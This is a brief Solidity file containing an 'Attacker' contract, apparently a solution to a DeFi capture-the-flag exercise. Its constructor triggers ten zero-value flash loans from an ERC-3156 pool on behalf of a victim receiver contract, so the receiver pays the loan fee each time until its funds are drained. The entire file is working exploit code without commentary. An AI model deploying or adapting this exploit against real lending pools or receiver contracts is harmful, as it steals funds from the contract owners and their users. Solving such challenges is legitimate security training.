// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/interfaces/IERC3156FlashLender.sol";

contract Attacker {
    address public constant ETH = 0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE;

    constructor (address _pool, address _receiver) {
        for(uint i=0; i<10; i++)
            IERC3156FlashLender(_pool).flashLoan(
                IERC3156FlashBorrower(_receiver),
                ETH,
                0,
                ''
            );
    }
}